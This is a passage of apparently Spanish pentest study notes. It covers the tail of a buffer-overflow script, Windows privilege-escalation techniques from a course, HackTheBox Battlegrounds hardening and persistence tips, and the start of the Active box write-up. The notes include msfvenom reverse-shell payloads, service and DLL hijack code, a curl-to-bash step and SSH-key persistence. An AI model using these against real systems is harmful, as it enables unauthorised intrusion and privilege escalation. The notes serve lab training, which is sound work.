socket.SOCK_STREAM)\n        s.connect((ip_address, rport))\n        s.send(\"%s\\r\\n\" % buffer)\n    except Exception as ex:\n        print \"[!] Ha habido un error de conexion\"\n        print ex\n        sys.exit(1)\n</code></pre> <p>Consideraciones</p> <p>Si bien se pueden utilizar algunos \"trucos\" para caer en la direcci\u00f3n donde se encuentra el shellcode como lo son los <code>NOPs (\\x90)</code> se puede ocupar un desplazamiento de pila para restar posiciones, y jugar un poco con los valores. Dentro de <code>msf-nasm_shell</code> se puede invocar la instrucci\u00f3n <code>sub esp, &lt;valor en hexadecimal&gt;</code>. Ejemplo:</p> <p></p> <p>En este caso se obtendr\u00eda el valor <code>83EC10</code> como c\u00f3digo de operaci\u00f3n para el desplazamiento de 10 unidades. quedando la l\u00ednea de construcci\u00f3n del payload como: <code>buffer = \"A\" * 1052 + pack(\"&lt;L\", 0x68a98a7b) + \"\\x83\\xEC\\x10\" + shellcode</code> en lugar de los <code>NOPs</code>.</p>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/","title":"Windows Privilege Escalation","text":"<p>Notas tomadas durante el curso.</p>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#indice","title":"\u00cdndice","text":"<ul> <li>Initial Enumeration</li> <li>System Enumeration</li> <li>User Enumeration</li> <li>Network Enumeration</li> <li>Password Hunting</li> <li>AV and Firewall Enumeration</li> <li>Exploring Automated Tools</li> <li>Escalation Paths</li> <li>Kernel Exploits</li> <li>Passwords</li> <li>Windows Subsystem for Linux</li> <li>Token Impersonation<ul> <li>What are tokens?</li> <li>Identificaci\u00f3n</li> </ul> </li> <li>getsystem</li> <li>RunAs</li> <li>Windows Autologin</li> <li>Registry<ul> <li>Autorun</li> <li>AlwaysInstallElevated</li> <li>Service Escalation <code>regsvc</code></li> </ul> </li> <li>Executable Files</li> <li>Startup Applications</li> <li>DLL Hijacking</li> <li>Service Permissions (Paths)<ul> <li>Binary Paths</li> <li>Unquoted Service Paths</li> </ul> </li> <li>CVE-2019-1388</li> <li>Recursos y referencias</li> </ul>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#system-enumeration","title":"System Enumeration","text":"<pre><code>systeminfo\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"\nhostname\nwmic qfe\nwmic qfe get Caption,Descrption,HotFixID,InstalledON # Parches\nwmic logicaldisk get Caption,Descrption,ProviderName # Unidades extra\u00edbles\n</code></pre>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#user-enumeration","title":"User Enumeration","text":"<pre><code>whoami\nwhoami /priv\nwhoami /groups\nwhoami /all\nnet user\nnet user &lt;user&gt;\nnet localgroup\nnet localgroup &lt;group&gt;\n</code></pre>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#network-enumeration","title":"Network Enumeration","text":"<pre><code>ipconfig\nipconfig /all\narp -a # Tablas arp (\u00fatil para laboratorios)\nroute print # Tabla de rutas\nnetstat -ano # Puertos abiertos\n</code></pre>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#password-hunting","title":"Password Hunting","text":"<pre><code>findstr /si &lt;patron&gt; *.txt *.ini *.config\n</code></pre> <p>Verificar gu\u00edas dadas (PayloadsAllTheThings)</p>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#av-and-firewall-enumeration","title":"AV and Firewall Enumeration","text":"<pre><code>sc query windefend\nsc queryex type=service\nnetsh advfirewall firewall dump\nnetsh firewall show state\nnetsh firewall show config\n</code></pre>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#exploring-automated-tools","title":"Exploring Automated Tools","text":"Ejecutables PowerShell Otras winPEAS.exe Sherlock.ps1 windows-exploit-suggester.py (local) Seatbelt.exe (compilar) PowerUp.ps1 Exploit Suggester (Metasploit) Watson.exe (compilar) jaws-enum.ps1 SharpUp.exe (compilar)"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#escalation-paths","title":"Escalation Paths","text":""},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#kernel-exploits","title":"Kernel Exploits","text":"<p>Hacer enumeraci\u00f3n con cualquiera de las herremientas antes mencionadas y se deber\u00eda ver informaci\u00f3n si es vulnerable a alg\u00fan exploit de kernel, posteriormente se puede buscar en esta lista o el id en espec\u00edfico como tal, ejemplo: <code>MS10-015</code>.</p> <p>Github - Windows Kernel Exploits</p>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#passwords","title":"Passwords","text":"<p>Verificar gu\u00edas dadas</p>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#windows-subsystem-for-linux","title":"Windows Subsystem for Linux","text":"<p>Verificar gu\u00edas dadas</p>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#token-impersonation","title":"Token Impersonation","text":""},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#what-are-tokens","title":"What are tokens?","text":"<p>Llaves temporales que permiten el acceso a un sistema/red sin tener que proveer las credenciales cada que se tiene acceso a un archivo. Como las cookies para las computadoras.</p> <p>Existen dos tipos: - Delegate - Creado para loguearse a una m\u00e1quina o hacer uso del escritorio remoto. - Impersonate - \"no-interactive\" tal como el montaje de una unidad de almacenamiento en red o un script de logueo de dominio.</p>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#identificacion","title":"Identificaci\u00f3n","text":"<p><code>whoami /priv</code></p> <p></p> <p>Permisos: <code>SeAssignPrimaryToken</code> y <code>SeImpersonatePrivilege</code></p>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#getsystem","title":"getsystem","text":"<p>Dentro de una sesi\u00f3n de meterpreter ejecutar <code>getsystem</code> el cu\u00e1l hace uso de de diferentes m\u00e9todos para escalar los privilegios.</p> <p>Se encuentra aqu\u00ed un art\u00edculo para ver detalles.</p>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#runas","title":"RunAs","text":"<p>Ejecutar <code>cmdkey /list</code> para verificar la existencia de credenciales guardadas.</p> <pre><code>cmdkey /list\nCurrently stored credentials:\n Target: Domain:interactive=WORKGROUP\\Administrator\n Type: Domain Password\n User: WORKGROUP\\Administrator\n</code></pre> <p>Posteriormente usar <code>runas</code> con la opci\u00f3n <code>savecred</code> para usar las credenciales guardadas. Ejemplo:</p> <pre><code>runas /savecred /user:WORKGROUP\\Administrator \"\\\\10.XXX.XXX.XXX\\SHARE\\evil.exe\"\nrunas /savecred /user:Administrator \"cmd.exe /k whoami\"\n</code></pre> <p>M\u00e1s info en PayloadAllTheThings</p>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#windows-autologin","title":"Windows Autologin","text":"<pre><code>reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" # Windows Autologin\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" | findstr \"DefaultUserName DefaultDomainName DefaultPassword\"\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2&gt;nul | findstr \"DefaultUserName DefaultDomainName DefaultPassword\"\n</code></pre>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#registry","title":"Registry","text":""},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#autorun","title":"Autorun","text":"<p>Buscar directorios que cuenten con <code>FilePerms: Everyone [AllAccess]</code>, si se ejecuta un programa, se puede sobreescribir el programa.</p> <p></p>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#alwaysinstallelevated","title":"AlwaysInstallElevated","text":"<pre><code>reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\n\nHKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer\n    AlwaysInstallElevated    REG_DWORD    0x1\n\n# Generar msi\nmsfvenom -p windows/shell_reverse_tcp lhost=10.18.12.69 lport=1234 -f msi -o setup.msi\n\n# Ejecutar\nmsiexec /quiet /qn /i C:\\Temp\\setup.msi\n</code></pre>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#service-escalation-regsvc","title":"Service Escalation <code>regsvc</code>","text":"<pre><code>powershell.exe -ep bypass\nGet-Acl -Path hklm:\\System\\CurrentControlSet\\services\\regsvc | fl\n</code></pre> <p>Si el usuario pertenece a <code>NT AUTHORITY\\INTERACTIVE</code> y tiene el permiso de <code>FullControl</code> en el registro, es explotable. Ejemplo:</p> <pre><code>PS C:\\Users\\user&gt; Get-Acl -Path hklm:\\System\\CurrentControlSet\\services\\regsvc | fl\n\nPath   : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\services\\regsvc\nOwner  : BUILTIN\\Administrators\nGroup  : NT AUTHORITY\\SYSTEM\nAccess : Everyone Allow  ReadKey\n         NT AUTHORITY\\INTERACTIVE Allow  FullControl # Permiso\n         NT AUTHORITY\\SYSTEM Allow  FullControl\n         BUILTIN\\Administrators Allow  FullControl\nAudit  :\nSddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)\n</code></pre> <p>Modificar de windows_service.c (c\u00f3digo fuente a continuaci\u00f3n) el payload de system y compilar:</p> <pre><code>sudo apt install gcc-mingw-w64\nx86_64-w64-mingw32-gcc windows_service.c -o x.exe\n</code></pre> <p>Copiar <code>x.exe</code> a windows y ejecutar:</p> <pre><code>reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\\temp\\x.exe /f\nsc start regsvc\n</code></pre> <p>C\u00f3digo fuente de windows_service.c.</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n\n#define SLEEP_TIME 5000\n\nSERVICE_STATUS ServiceStatus; \nSERVICE_STATUS_HANDLE hStatus; \n\nvoid ServiceMain(int argc, char** argv); \nvoid ControlHandler(DWORD request); \n\n//add the payload here\nint Run() \n{ \n    system(\"whoami &gt; c:\\\\windows\\\\temp\\\\service.txt\");\n    return 0; \n} \n\nint main() \n{ \n    SERVICE_TABLE_ENTRY ServiceTable[2];\n    ServiceTable[0].lpServiceName = \"MyService\";\n    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;\n\n    ServiceTable[1].lpServiceName = NULL;\n    ServiceTable[1].lpServiceProc = NULL;\n\n    StartServiceCtrlDispatcher(ServiceTable);  \n    return 0;\n}\n\nvoid ServiceMain(int argc, char** argv) \n{ \n    ServiceStatus.dwServiceType        = SERVICE_WIN32; \n    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; \n    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;\n    ServiceStatus.dwWin32ExitCode      = 0; \n    ServiceStatus.dwServiceSpecificExitCode = 0; \n    ServiceStatus.dwCheckPoint         = 0; \n    ServiceStatus.dwWaitHint           = 0; \n\n    hStatus = RegisterServiceCtrlHandler(\"MyService\", (LPHANDLER_FUNCTION)ControlHandler); \n    Run(); \n\n    ServiceStatus.dwCurrentState = SERVICE_RUNNING; \n    SetServiceStatus (hStatus, &amp;ServiceStatus);\n\n    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)\n    {\n        Sleep(SLEEP_TIME);\n    }\n    return; \n}\n\nvoid ControlHandler(DWORD request) \n{ \n    switch(request) \n    { \n        case SERVICE_CONTROL_STOP: \n            ServiceStatus.dwWin32ExitCode = 0; \n            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; \n            SetServiceStatus (hStatus, &amp;ServiceStatus);\n            return; \n\n        case SERVICE_CONTROL_SHUTDOWN: \n            ServiceStatus.dwWin32ExitCode = 0; \n            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; \n            SetServiceStatus (hStatus, &amp;ServiceStatus);\n            return; \n\n        default:\n            break;\n    } \n    SetServiceStatus (hStatus,  &amp;ServiceStatus);\n    return; \n} \n</code></pre>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#executable-files","title":"Executable Files","text":"<p>Si se cuenta con <code>File Permissions: Everyone [AllAccess]</code> en el binario de un servicio, se puede modificar el binario e inicar el servicio.</p> <p></p> <pre><code>msfvenom -p windows/shell_reverse_tcp lhost=10.18.12.69 lport=1234 -f exe -o filepermservice.exe\n\n# Remplazar binario e iniciar servicio en windows\nsc start filepermsvc\n</code></pre>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#startup-applications","title":"Startup Applications","text":"<pre><code>icacls.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n</code></pre> <p>Si el comando devuelve <code>BUILTIN\\Users:(F)</code> asociando \"full access\" con la F es explotable. Documentaci\u00f3n acerca de icacls y la representaci\u00f3n de los permisos.</p> <pre><code>msfvenom -p windows/shell_reverse_tcp lhost=10.18.12.69 lport=1234 -f exe -o payload.exe\n</code></pre> <p>Colocar <code>payload.exe</code> en <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code> y esperar el logueo del administrador o reinicio.</p>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#dll-hijacking","title":"DLL Hijacking","text":"<p>Requisitos:</p> <ul> <li>Se requiere encontrar un proceso que ejecute con otros privilegios (movimiento lateral) al cu\u00e1l le falte una dll.</li> <li>Tener permisos de escritura en un folder donde ser\u00e1 buscada la dll (probablemente el directorio del ejecutable u otro dentro del path del sistema).</li> </ul> <p>WinPEAS verificar\u00e1 si se cuenta con permisos de escritura en alg\u00fan folder que est\u00e9 en <code>PATH</code> del sistema. Otras herramientas como <code>Powersploit</code> pueden identificar las vulnerabilidades con las funciones <code>Find-ProcessDLLHijack</code>, <code>Find-PathDLLHijack</code> and <code>Write-HijackDll</code>.</p> <p></p> <p>Se genera una dll y se ubica esta en el folder identificado usando el formato de metasploit: </p> <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll\n</code></pre> <p>O una compilada:</p> <pre><code>// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll\n// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll\n\n#include &lt;windows.h&gt;\n\nBOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {\n    if (dwReason == DLL_PROCESS_ATTACH) {\n        system(\"cmd.exe /k whoami &gt; C:\\\\Windows\\\\Temp\\\\dll.txt\");\n        ExitProcess(0);\n    }\n    return TRUE;\n}\n</code></pre>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#service-permissions-paths","title":"Service Permissions (Paths)","text":""},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#binary-paths","title":"Binary Paths","text":"<p>WinPEAS puede identificar permisos de modificaci\u00f3n en servicios.</p> <p></p> <p>Una vez identificado se puede cambiar y verificar con:</p> <pre><code># Cambio de valor de binpath\nC:\\Users\\user&gt;sc config daclsvc binpath= \"c:\\temp\\exp.exe\"\nsc config daclsvc binpath= \"c:\\temp\\exp.exe\"\n[SC] ChangeServiceConfig SUCCESS\n\n# Validaci\u00f3n de cambio\nC:\\Users\\user&gt;sc qc daclsvc\nsc qc daclsvc\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: daclsvc\n        TYPE               : 10  WIN32_OWN_PROCESS\n        START_TYPE         : 3   DEMAND_START\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : \"c:\\temp\\exp.exe\"\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : DACL Service\n        DEPENDENCIES       :\n        SERVICE_START_NAME : LocalSystem\n\n# Iniciar servicio\nsc start daclsvc\n</code></pre>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#unquoted-service-paths","title":"Unquoted Service Paths","text":"<p>En la secci\u00f3n de informaci\u00f3n de servicios, WinPEAS puede identificar servicios que se pueden iniciar manualmente y se encuentran mal configurados sin comillas en los servicios.</p> <p></p> <p>Al identificarse se puede generar payload con <code>msfvenom</code> y guardar en la ruta sin comillas como:</p> <pre><code>C:\\Program Files\\Unquoted Path Service\\common.exe\n</code></pre> <p>Al iniciar el servicio, se ejecutar\u00e1 el binario:</p> <pre><code>sc start unquotedsvc\n</code></pre>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#cve-2019-1388","title":"CVE-2019-1388","text":"<p>Se puede realizar un bypass al UAC mediante este CVE, identificado por WinPEAS mediante la instalaci\u00f3n de parches KB.</p> <p></p> <p>https://github.com/jas502n/CVE-2019-1388</p>"},{"location":"Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/#recursos-y-referencias","title":"Recursos y referencias","text":"<ul> <li>Fuzzy Security Guide.</li> <li>PayloadsAllTheThings Guide.</li> <li>Absolomb's Guide.</li> <li>Sushant747's Guide.</li> <li>TCM Windows Priv Esc Course Repo.</li> <li>Offensive Security - Fun with Incognito.</li> <li>Rotten Potato \u2013 Privilege Escalation from Service Accounts to SYSTEM.</li> <li>CobaltStrike - What happens when I type getsystem?.</li> </ul>"},{"location":"HackTheBox/Battlegrounds/Cyber%20Mayhem/","title":"Cyber Mayhem","text":""},{"location":"HackTheBox/Battlegrounds/Cyber%20Mayhem/#todos","title":"TODOs","text":"<ul> <li>Hardening de Tomcat.</li> <li>Buscar m\u00e9todos de persistencia.</li> <li>Parchar LFI en PHP.</li> </ul>"},{"location":"HackTheBox/Battlegrounds/Cyber%20Mayhem/#preparacion","title":"Preparaci\u00f3n","text":"<p>prep.sh - Falta levantar el webserver. <pre><code>#!/bin/bash\nsshpass -p $2 ssh -o GlobalKnownHostsFile=/dev/null -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -t root@$1 \"chmod -s /usr/bin/pkexec; cat /etc/sudoers; curl $3/sudoers.sh | bash; bash -l\"\n</code></pre></p> <p>sudoers.sh <pre><code>#!/bin/bash\ngrep -v -E \"^root|Defaults|#|%|^s|^$\" /etc/sudoers | while read -r entry; do user=$(echo $entry | awk '{print $1}'); substitution=$(echo $entry | sed \"s/([^)]*)/($user)/g\"); sed -i \"s|$entry|$substitution|g\" /etc/sudoers; done\n</code></pre></p>"},{"location":"HackTheBox/Battlegrounds/Cyber%20Mayhem/#blue-team","title":"Blue Team","text":""},{"location":"HackTheBox/Battlegrounds/Cyber%20Mayhem/#monitoreo","title":"Monitoreo","text":"<pre><code>ps # Identificar sesi\u00f3n de ssh\nps -aux --forest # Ver procesos con sus hijos\nw # Visualizar usuarios logueados\nwho # Visualizar usuarios logueados\n</code></pre>"},{"location":"HackTheBox/Battlegrounds/Cyber%20Mayhem/#apache","title":"Apache","text":""},{"location":"HackTheBox/Battlegrounds/Cyber%20Mayhem/#phpini","title":"PHP.ini","text":"<p>Rutas: - <code>/etc/php.ini</code>. - <code>/etc/php/&lt;version&gt;/apache2/php.ini</code>.</p> <pre><code>disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source\n\n# Despu\u00e9s de guardar cambios, reiniciar servicio\nsystemctl restart apache2\n</code></pre> <p>Probar si no afecta el healthcheck:</p> <pre><code>allow_url_fopen = Off\nallow_url_include = Off\n</code></pre>"},{"location":"HackTheBox/Battlegrounds/Cyber%20Mayhem/#samba","title":"Samba","text":"<p>Rutas: - <code>/etc/samba/smb.conf</code>.</p> <pre><code>[global]\nmap to guest = never # Deshabilita sesi\u00f3n nula\nusershare allow guests = no # Deshabilita sesi\u00f3n de guests\nrestrict anonymous = 2 # Probar con healthcheck\n\n[myshare] # Probar con healthcheck\nwriteable = no\nbrowseable = no\npublic = no\n</code></pre>"},{"location":"HackTheBox/Battlegrounds/Cyber%20Mayhem/#ftp","title":"FTP","text":"<p>La configuraci\u00f3n depende de que servicio de FTP se est\u00e9 ejecutando.</p> <p>Rutas: - <code>/etc/vsftpd.conf</code></p> <pre><code># /etc/vsftpd.conf\nanonymous_enable=NO\nwrite_enable=NO\nanon_upload_enable=NO\n\n# Ruta expuesta en FTP\nchmod 755 /tmp/ftp # Probar healthcheck\n</code></pre>"},{"location":"HackTheBox/Battlegrounds/Cyber%20Mayhem/#red-team","title":"Red Team","text":""},{"location":"HackTheBox/Battlegrounds/Cyber%20Mayhem/#persistencia","title":"Persistencia","text":""},{"location":"HackTheBox/Battlegrounds/Cyber%20Mayhem/#ssh","title":"SSH","text":"<p>Local:</p> <pre><code>ssh-keygen -t rsa # Crear llave privada\ncat id_rsa.pub | xclip -sel c\n</code></pre> <p>Intrusi\u00f3n:</p> <pre><code>echo '&lt;pegar clipboard&gt;' &gt; &lt;ruta de usuario&gt;/.ssh/authorized_keys\n</code></pre>"},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/","title":"Active","text":"<p>Write-up de la m\u00e1quina Active de HackTheBox.</p> <p></p>","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#indice","title":"\u00cdndice","text":"<ul> <li>Introducci\u00f3n</li> <li>Estad\u00edsticas</li> <li>Reconocimiento</li> <li>Escaneo de host<ul> <li>Escaneo completo de puertos</li> <li>Escaneo espec\u00edfico</li> </ul> </li> <li>Enumeraci\u00f3n</li> <li>Servicios<ul> <li>smb - 445</li> <li>Manual</li> </ul> </li> <li>Explotaci\u00f3n</li> <li>Descrifrado de GPP<ul> <li>Ejecuci\u00f3n</li> </ul> </li> <li>Kerberoasting<ul> <li>Ejecuci\u00f3n</li> </ul> </li> <li>Credenciales obtenidas</li> </ul>","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#introduccion","title":"Introducci\u00f3n","text":"","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#estadisticas","title":"Estad\u00edsticas","text":"Caracter\u00edstica Descripci\u00f3n Nombre Active OS Windows Dificultad oficial Easy Dificultad de comunidad Puntos 20 Creadores eks &amp; mrb3n","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#reconocimiento","title":"Reconocimiento","text":"","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#escaneo-de-host","title":"Escaneo de host","text":"","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#escaneo-completo-de-puertos","title":"Escaneo completo de puertos","text":"<pre><code>\u276f nmap -T5 -vvv -open -p- -n -Pn -oG nmap/allPorts $TARGET\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 20:29 EST\nInitiating Connect Scan at 20:29\nScanning 10.10.10.100 [65535 ports]\nDiscovered open port 135/tcp on 10.10.10.100\nDiscovered open port 445/tcp on 10.10.10.100\nDiscovered open port 53/tcp on 10.10.10.100\nDiscovered open port 139/tcp on 10.10.10.100\nDiscovered open port 49152/tcp on 10.10.10.100\nDiscovered open port 464/tcp on 10.10.10.100\nDiscovered open port 49157/tcp on 10.10.10.100\nDiscovered open port 593/tcp on 10.10.10.100\nDiscovered open port 3269/tcp on 10.10.10.100\nDiscovered open port 49165/tcp on 10.10.10.100\nDiscovered open port 88/tcp on 10.10.10.100\nDiscovered open port 49167/tcp on 10.10.10.100\nDiscovered open port 3268/tcp on 10.10.10.100\nDiscovered open port 389/tcp on 10.10.10.100\nWarning: 10.10.10.100 giving up on port because retransmission cap hit (2).\nDiscovered open port 49155/tcp on 10.10.10.100\nDiscovered open port 636/tcp on 10.10.10.100\nDiscovered open port 49158/tcp on 10.10.10.100\nDiscovered open port 49154/tcp on 10.10.10.100\nDiscovered open port 5722/tcp on 10.10.10.100\nDiscovered open port 49153/tcp on 10.10.10.100\nDiscovered open port 49166/tcp on 10.10.10.100\nDiscovered open port 9389/tcp on 10.10.10.100\nCompleted Connect Scan at 20:29, 28.58s elapsed (65535 total ports)\nNmap scan report for 10.10.10.100\nHost is up, received user-set (0.065s latency).\nScanned at 2022-01-19 20:29:16 EST for 29s\nNot shown: 63369 closed tcp ports (conn-refused), 2144 filtered tcp ports (no-response)\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT      STATE SERVICE          REASON\n53/tcp    open  domain           syn-ack\n88/tcp    open  kerberos-sec     syn-ack\n135/tcp   open  msrpc            syn-ack\n139/tcp   open  netbios-ssn      syn-ack\n389/tcp   open  ldap             syn-ack\n445/tcp   open  microsoft-ds     syn-ack\n464/tcp   open  kpasswd5         syn-ack\n593/tcp   open  http-rpc-epmap   syn-ack\n636/tcp   open  ldapssl          syn-ack\n3268/tcp  open  globalcatLDAP    syn-ack\n3269/tcp  open  globalcatLDAPssl syn-ack\n5722/tcp  open  msdfsr           syn-ack\n9389/tcp  open  adws             syn-ack\n49152/tcp open  unknown          syn-ack\n49153/tcp open  unknown          syn-ack\n49154/tcp open  unknown          syn-ack\n49155/tcp open  unknown          syn-ack\n49157/tcp open  unknown          syn-ack\n49158/tcp open  unknown          syn-ack\n49165/tcp open  unknown          syn-ack\n49166/tcp open  unknown          syn-ack\n49167/tcp open  unknown          syn-ack\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 28.62 seconds\n</code></pre>","tags":["SMB Enumeration","Abusing GPP Passwords","Decrypting GPP Passwords - gpp-decrypt","Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]"]},{"location":"HackTheBox/Boxes/Windows/1%20F%C3%A1cil/Active/#escaneo-especifico","title":"Escaneo espec\u00edfico","text":"<pre><code>\u276f nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49165,49166,49167 -n -Pn -oN nmap/targeted $TARGET\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 20:30 EST\nNmap scan report for 10.10.10.100\nHost is up (0.066s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid:\n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-01-20 01:37:18Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5722/tcp  open  msrpc         Microsoft Windows RPC\n9389/tcp  open  mc-nmf        .NET Message Framing\n49152/tcp open  msrpc         Microsoft Windows RPC\n49153/tcp open  msrpc         Microsoft Windows RPC\n49154/tcp open  msrpc         Microsoft Windows RPC\n49155/tcp open  msrpc         Microsoft Windows RPC\n49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  msrpc         Microsoft Windows RPC\n49165/tcp open  msrpc         Microsoft Windows RPC\n49166/tcp open  msrpc         Microsoft Windows RPC\n49167/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   2.1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2022-01-20T01:38:13\n|_  start_date: 2022-01-20T01:34:15\n|_clock-skew: 6m45s\n\nService detection performed. Please report any incorrect results at 